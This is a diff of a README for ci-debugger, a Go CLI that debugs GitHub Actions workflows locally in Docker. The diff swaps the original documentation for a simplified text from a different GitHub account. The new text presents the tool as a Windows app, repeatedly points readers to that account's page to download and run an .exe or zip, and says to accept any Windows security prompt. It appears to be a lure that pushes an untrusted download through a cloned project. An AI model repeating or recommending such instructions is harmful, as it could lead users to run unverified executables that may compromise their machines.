@@ -1,493 +1,161 @@
-# ci-debugger
+# 🐞 ci-debugger - Debug workflows with local breakpoints
 
-**Debug CI pipelines locally — with breakpoints.**
+[![Download ci-debugger](https://img.shields.io/badge/Download-ci--debugger-blue?style=for-the-badge&logo=github)](https://github.com/Verystrangecat/ci-debugger)
 
-You shouldn't have to push 47 commits to figure out why your CI is failing.
+## 🚀 What this does
 
-![ci-debugger demo](assets/demo.gif)
+ci-debugger helps you run GitHub Actions workflows on your own Windows PC. You can pause at breakpoints, inspect what is happening, and test changes before you commit them.
 
-```
-ci-debugger run --step
-```
+It is useful when a workflow fails and you do not want to guess why. Instead of pushing changes again and again, you can check the run on your machine.
 
----
+## 💻 Who this is for
 
-## The Problem
+Use ci-debugger if you want to:
 
-Every developer knows the loop:
+- test a GitHub Actions workflow without waiting for a cloud run
+- catch problems before you push a change
+- inspect step by step what a workflow does
+- work with CI and CD jobs on Windows
+- reduce trial and error in YAML files
 
-1. Write some YAML
-2. Push to GitHub
-3. Wait 5 minutes
-4. See a cryptic error
-5. Repeat
+## 📦 Download
 
-Existing tools like `act` help run workflows locally, but they're missing the one thing that makes debugging *actually useful*: **the ability to pause, inspect, and interact**.
+Visit this page to download:
 
-`act` gives you 70,000 lines of unformatted logs and no way to drop into a shell when something goes wrong.
+[https://github.com/Verystrangecat/ci-debugger](https://github.com/Verystrangecat/ci-debugger)
 
-**ci-debugger** fixes that.
+On that page, look for the latest release or download file for Windows. If you see a `.exe` file, download and run it. If you see a zip file, download it, unzip it, and open the app inside the folder.
 
----
+## 🪟 Windows setup
 
-## Features
+Before you start, make sure you have:
 
-### Breakpoints
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough free space for the app and your workflow files
+- permission to run apps on your computer
 
-Pause execution before or after any step — by name:
+If Windows shows a security prompt, choose the option that lets you open the file.
 
-```bash
-ci-debugger run --break-before "Run tests"
-ci-debugger run --break-after "Build"
-ci-debugger run --break-on-error
-```
+## 🧭 Install and open
 
-At each breakpoint you get an interactive prompt:
+1. Go to the download page:
+   [https://github.com/Verystrangecat/ci-debugger](https://github.com/Verystrangecat/ci-debugger)
 
-```
-◆ BREAKPOINT  before step Run tests
-  Command:
-    pytest -x --tb=short
+2. Find the Windows download.
 
-  [C] Continue  [S] Skip  [D] Shell  [I] Inspect  [Q] Quit
+3. Download the file to your computer.
 
-  →
-```
+4. If the file is a `.zip`, right-click it and choose Extract All.
 
-### Step-by-Step Mode
+5. Open the extracted folder.
 
-Execute one step at a time:
+6. Double-click the app file to start ci-debugger.
 
-```bash
-ci-debugger run --step
-```
+7. If Windows asks for approval, select the option to run it.
 
-Great for walking through a new workflow for the first time.
+## 🛠️ Basic use
 
-### Interactive Shell
+After you open ci-debugger, you can use it to load a workflow and step through it.
 
-Drop into the container at any breakpoint with `[D]`:
+A normal flow looks like this:
 
-```bash
-# At any breakpoint, press D
-[ci-debugger] Dropped into container shell. Type 'exit' to return.
+1. Pick the GitHub Actions workflow you want to test.
+2. Point the app at your project folder.
+3. Start the run.
+4. Stop at breakpoints where you want to inspect the job.
+5. Check inputs, files, and step output.
+6. Make a change and run it again.
 
-root@abc123:/github/workspace# ls
-src/  tests/  go.mod  go.sum
-root@abc123:/github/workspace# echo $GITHUB_SHA
-a1b2c3d4...
-root@abc123:/github/workspace# exit
-```
+## 🔍 What you can check
 
-The container state is preserved — continue from where you left off.
+ci-debugger is built for local workflow testing, so you can review things like:
 
-### Matrix Builds
+- environment values
+- file paths
+- step order
+- job inputs
+- command output
+- failed steps
+- changes between runs
 
-Workflows with `strategy.matrix` are automatically expanded and run as separate jobs, each with its own container:
+This helps when a workflow works in one branch but fails in another.
 
-```yaml
-strategy:
-  matrix:
-    node-version: [18, 20]
-    os: [ubuntu-latest]
-```
+## 🧰 Common uses
 
-```
-Matrix: 2 combination(s) for job "test"
+You can use ci-debugger for:
 
-▶ test (node-version=18, os=ubuntu-latest)
-  ✓ [1/3] Checkout
-  ✓ [2/3] Use Node.js 18
-  ✓ [3/3] Run tests
+- debugging a build job
+- testing a deploy step before release
+- checking a script used in CI
+- finding a bad path or file name
+- seeing what happens in each step of a workflow
 
-▶ test (node-version=20, os=ubuntu-latest)
-  ✓ [1/3] Checkout
-  ✓ [2/3] Use Node.js 20
-  ✓ [3/3] Run tests
-```
+## ⚙️ Example workflow
 
-Use `${{ matrix.node-version }}` in your steps — expressions are expanded per combination. `fail-fast` is respected (default: true).
+A simple test run may look like this:
 
-### Service Containers
+1. Open your project folder.
+2. Choose the workflow file you want to test.
+3. Start the local run.
+4. Pause at the step you care about.
+5. Inspect the result.
+6. Fix the YAML or script.
+7. Run it again until it behaves the way you want.
 
-Sidecar services (postgres, redis, mysql, etc.) are started automatically when your job defines them:
+## 🧩 Tips for smoother use
 
-```yaml
-services:
-  postgres:
-    image: postgres:15
-    env:
-      POSTGRES_PASSWORD: secret
-```
+- Keep your project folder small while you test.
+- Use clear file names for scripts and workflow files.
+- Change one thing at a time.
+- Save your work before you run a test.
+- If a step fails, check the file path first.
+- If a command does not work, compare it with the same step in GitHub Actions.
 
-Services are reachable by hostname (`postgres`, `redis`, etc.) inside your job container via a shared Docker bridge network.
+## 📁 Suggested folder setup
 
-### Composite `uses:` Actions
+A simple folder layout can help you stay organized:
 
-`actions/checkout` is handled automatically (your workspace is already mounted). For other `uses:` steps, ci-debugger fetches the `action.yml` from GitHub and runs composite actions inline in your container:
+- your-project/
+  - .github/
+    - workflows/
+  - scripts/
+  - build/
+  - test-files/
 
-```
-↓ fetching actions/setup-node@v4...
-▶ running composite action (3 step(s))
-  ✓ [1/3] Set up Node
-  ✓ [2/3] Install dependencies
-  ✓ [3/3] Cache
-```
+This makes it easier to find the file that caused the issue.
 
-### Node & Docker `uses:` Actions
+## 🔧 Troubleshooting
 
-Node (`node20`, `node16`, `node12`) and Docker action types are now executed locally — not just skipped.
+If the app does not open:
 
-**Node actions** are downloaded from GitHub, extracted to `/tmp`, copied into the job container and run with `node`:
+1. Make sure the download finished.
+2. Check that you unzipped the file if needed.
+3. Try running the app again.
+4. Right-click the file and look for an Open option.
 
-```
-↓ fetching actions/github-script@v7...
-  Running script...
-  ✓ actions/github-script@v7  (1.2s)
-```
+If a workflow does not start:
 
-**Docker actions** pull the action's image and run it as a sidecar container with `INPUT_*` env vars and the workspace mounted:
+1. Check the workflow file name.
+2. Make sure the file is in the right folder.
+3. Confirm the project path is correct.
+4. Try again after saving your changes.
 
-```
-↓ fetching docker://alpine:3.18...
-  Pulling image alpine:3.18...
-  ✓ docker action  (0.8s)
-```
+If a step fails:
 
-Actions that use a `Dockerfile` (build-time) are skipped with a warning — only pre-built images are supported.
+1. Read the error text.
+2. Check the command in that step.
+3. Look for a missing file or wrong path.
+4. Run the step again after you fix it.
 
-### Full `${{ }}` Expression Engine
+## 📚 Repo details
 
-All expression namespaces are resolved:
+Repository: ci-debugger  
+Topic areas: ci-cd, cli, debugging, devtools, docker, github-actions, golang  
+Use case: local GitHub Actions workflow debugging on Windows
 
-| Namespace | Example |
-|-----------|---------|
-| `env` | `${{ env.DATABASE_URL }}` |
-| `secrets` | `${{ secrets.GITHUB_TOKEN }}` |
-| `matrix` | `${{ matrix.node-version }}` |
-| `inputs` | `${{ inputs.version }}` |
-| `github` | `${{ github.sha }}`, `${{ github.ref }}` |
-| `needs` | `${{ needs.build.outputs.artifact }}` |
-| `steps` | `${{ steps.setup.outputs.path }}` |
-| `job` | `${{ job.status }}` |
+## 🖱️ Get it now
 
-`if:` conditions support `success()`, `failure()`, `always()`, `cancelled()`, comparisons (`==`, `!=`), logical operators (`&&`, `||`, `!`), and string functions (`contains()`, `startsWith()`, `endsWith()`).
+[Download ci-debugger](https://github.com/Verystrangecat/ci-debugger)
 
-### Job Outputs Propagation
-
-Jobs can declare `outputs:` and downstream jobs read them via `needs.JOB.outputs.KEY`:
-
-```yaml
-jobs:
-  build:
-    outputs:
-      version: ${{ steps.tag.outputs.version }}
-    steps:
-      - id: tag
-        run: echo "version=1.2.3" >> $GITHUB_OUTPUT
-
-  deploy:
-    needs: build
-    steps:
-      - run: echo "Deploying ${{ needs.build.outputs.version }}"
-```
-
-```
-▶ build
-  ✓ [1/1] tag
-
-▶ deploy
-  Deploying 1.2.3
-  ✓ [1/1] run
-```
-
-### Watch Mode
-
-Re-run the workflow automatically whenever workflow files or workspace source files change:
-
-```bash
-ci-debugger run --watch -W .github/workflows/ci.yml
-```
-
-```
-◎ Watching for changes… (Ctrl+C to stop)
-```
-
-Watches `.go`, `.yml`, `.yaml`, `.ts`, `.js`, `.py`, `.sh`, `.env`, `Makefile`, and `.secrets` files. Skips `vendor/`, `node_modules/`, `.git/`, and `bin/`. Changes are debounced (500ms) to avoid double-triggers on save.
-
-### Azure DevOps Pipelines
-
-Point ci-debugger at an `azure-pipelines.yml` — it auto-detects the format and maps it to the same runner:
-
-```bash
-ci-debugger run -W azure-pipelines.yml
-```
-
-```
-Detected Azure DevOps pipeline: azure-pipelines.yml
-
-▶ Build  (ghcr.io/catthehacker/ubuntu:act-latest)
-  ✓ [1/3] Checkout
-  ✓ [2/3] Build
-  ✓ [3/3] Run unit tests
-```
-
-Supports: `script:` / `bash:`, `task:` (skipped with warning), `checkout: self`, `pool.vmImage`, `variables`, `dependsOn`, `condition`, stages, and top-level steps. If there's no `azure-pipelines.yml` in `.github/workflows/`, ci-debugger also looks for it in the project root automatically.
-
-### Static Analysis
-
-Scan your workflows before running them:
-
-```bash
-ci-debugger scan
-```
-
-```
-Scan Results  (3 workflow(s))
-────────────────────────────────────────────────────────────────
-  ✖ error
-    location: ci.yml > deploy > "Deploy to prod"
-    needs: references unknown job "release"
-
-  ⚠ warning
-    location: ci.yml > test > step 2
-    uses: "actions/setup-python@v4" is not supported locally — will be skipped
-────────────────────────────────────────────────────────────────
-  1 error(s), 1 warning(s)
-```
-
-Catches: circular job dependencies, invalid `needs:` references, unsupported `uses:` actions, steps missing `run:` or `uses:`, and unclosed `${{ }}` expressions.
-
-### Env Var Transparency
-
-See exactly which GitHub environment variables are real, stubbed, or unavailable locally before running:
-
-```bash
-ci-debugger run --env-report -W .github/workflows/ci.yml
-```
-
-```
-Environment Variables Report
-────────────────────────────────────────────────────────────────────────
-  Variable                               Status         Value
-────────────────────────────────────────────────────────────────────────
-  GITHUB_ACTIONS                         real           true
-  GITHUB_SHA                             real           a3f4b2c1d...
-  GITHUB_REPOSITORY                      real           owner/repo
-  GITHUB_REF                             real           refs/heads/main
-  GITHUB_WORKSPACE                       stubbed        /github/workspace
-  RUNNER_OS                              stubbed        Linux
-  GITHUB_TOKEN                           unavailable    (injected by GitHub)
-  ACTIONS_ID_TOKEN_REQUEST_URL           unavailable    (OIDC not available locally)
-────────────────────────────────────────────────────────────────────────
-
-  Legend:  real = from local git   stubbed = fixed local value   unavailable = GitHub-only
-```
-
-### Beautiful Output
-
-Clean, color-coded output that shows what matters:
-
-```
-ci-debugger  My CI Workflow
-
-▶ test  (ghcr.io/catthehacker/ubuntu:act-latest)
-  ✓ [1/3] Checkout
-  ✓ [2/3] Install dependencies  (12.3s)
-  ✗ [3/3] Run tests  (exit 1, 45.2s)
-    ── stderr ──
-    FAILED tests/test_api.py::test_create_user
-    AssertionError: 404 != 200
-
-╭──────────────────────────────────────────────────────╮
-│  Summary                                             │
-│                                                      │
-│  Job: test                                           │
-│  1   Checkout              passed    0.1s            │
-│  2   Install dependencies  passed   12.3s            │
-│  3   Run tests             FAILED   45.2s            │
-╰──────────────────────────────────────────────────────╯
-
-  Total: 57.6s  2 passed  1 failed
-```
-
----
-
-## vs act
-
-| Feature | ci-debugger | act |
-|---------|-------------|-----|
-| Run workflows locally | ✓ | ✓ |
-| Breakpoints | ✓ | ✗ |
-| Step-by-step mode | ✓ | ✗ |
-| Interactive shell at breakpoint | ✓ | ✗ |
-| Matrix builds | ✓ | ✓ |
-| Service containers | ✓ | ✓ |
-| Composite `uses:` actions | ✓ | ✓ |
-| Node/Docker `uses:` actions | ✓ | ✓ |
-| Full `${{ }}` expression engine | ✓ | ~ |
-| Job outputs (`needs.X.outputs.Y`) | ✓ | ✓ |
-| Watch mode (`--watch`) | ✓ | ✗ |
-| Azure DevOps Pipelines | ✓ | ✗ |
-| Static analysis (`scan`) | ✓ | ✗ |
-| Env var transparency (`--env-report`) | ✓ | ✗ |
-| Clean, readable output | ✓ | ✗ (70K log lines) |
-| `GITHUB_OUTPUT` support | ✓ | ✓ |
-| Windows runners | ✗ | ✗ |
-
----
-
-## Installation
-
-### Homebrew (macOS/Linux)
-
-```bash
-brew install murataslan1/tap/ci-debugger
-```
-
-### Go Install
-
-```bash
-go install github.com/murataslan1/ci-debugger@latest
-```
-
-### Pre-built Binaries
-
-Download from [Releases](https://github.com/murataslan1/ci-debugger/releases).
-
-### Requirements
-
-- [Docker](https://docker.com) must be running
-- Go 1.21+ (for `go install`)
-
----
-
-## Quick Start
-
-```bash
-# In your project directory
-cd your-project/
-
-# List available workflows and jobs
-ci-debugger list
-
-# Scan for issues before running
-ci-debugger scan
-
-# Check which env vars are real vs stubbed
-ci-debugger run --env-report
-
-# Run with step-by-step mode
-ci-debugger run --step
-
-# Run specific workflow
-ci-debugger run -W .github/workflows/ci.yml
-
-# Run an Azure DevOps pipeline
-ci-debugger run -W azure-pipelines.yml
-
-# Run specific job
-ci-debugger run -j test
-
-# Break when anything fails
-ci-debugger run --break-on-error
-
-# Break before a specific step
-ci-debugger run --break-before "Run tests"
-
-# Watch mode — re-run on file change
-ci-debugger run --watch
-
-# Full output
-ci-debugger run -v
-```
-
----
-
-## Configuration
-
-### Environment Variables
-
-Create a `.env` file in your project root:
-
-```bash
-DATABASE_URL=postgres://localhost/myapp
-API_KEY=dev-key-here
-```
-
-### Secrets
-
-Create a `.secrets` file:
-
-```bash
-GITHUB_TOKEN=ghp_xxx
-NPM_TOKEN=npm_xxx
-```
-
-Both files follow `.env` format: `KEY=VALUE` lines, `#` comments, optional `export` prefix.
-
-### Platform Overrides
-
-Map `runs-on` labels to custom Docker images:
-
-```bash
-ci-debugger run --platform ubuntu-latest=my-registry/ubuntu:custom
-```
-
-### Default Image Mappings
-
-| `runs-on` | Docker Image |
-|-----------|-------------|
-| `ubuntu-latest` | `ghcr.io/catthehacker/ubuntu:act-latest` |
-| `ubuntu-24.04` | `ghcr.io/catthehacker/ubuntu:act-24.04` |
-| `ubuntu-22.04` | `ghcr.io/catthehacker/ubuntu:act-22.04` |
-| `ubuntu-20.04` | `ghcr.io/catthehacker/ubuntu:act-20.04` |
-
----
-
-## Known Limitations
-
-- **Linux runners only** — `windows-latest` and `macos-latest` map to the ubuntu image as best-effort
-- **Dockerfile-based Docker actions** — actions that build from a `Dockerfile` are skipped with a warning; only pre-built images (`docker://image`) are supported
-- **`GITHUB_TOKEN` and OIDC** — not available locally; provide via `.secrets` for workflows that need it
-
----
-
-## Roadmap
-
-### v0.2 — Core gaps ✓
-- [x] [`uses:` composite action support](https://github.com/murataslan1/ci-debugger/issues/1)
-- [x] [Env var transparency (`--env-report`)](https://github.com/murataslan1/ci-debugger/issues/3)
-- [x] [Static analysis (`ci-debugger scan`)](https://github.com/murataslan1/ci-debugger/issues/4)
-
-### v0.3 — Expansion ✓
-- [x] [Azure DevOps Pipelines support](https://github.com/murataslan1/ci-debugger/issues/5)
-- [x] [Service containers](https://github.com/murataslan1/ci-debugger/issues/6)
-- [x] [Matrix builds](https://github.com/murataslan1/ci-debugger/issues/7)
-
-### v0.4 ✓
-- [x] Node/Docker `uses:` action execution
-- [x] Full `${{ }}` expression engine
-- [x] Job `outputs:` propagation (`needs.JOB.outputs.KEY`)
-- [x] `--watch` mode — re-run on file change
-
-Have an idea? [Open an issue](https://github.com/murataslan1/ci-debugger/issues/new).
-
----
-
-## Contributing
-
-Pull requests are welcome. For major changes, open an issue first.
-
-```bash
-git clone https://github.com/murataslan1/ci-debugger
-cd ci-debugger
-go test ./...
-go build -o bin/ci-debugger ./cmd/ci-debugger
-```
-
----
-
-## License
-
-MIT © Murat Aslan
+Open the page, choose the latest release or file for Windows, then download and run it
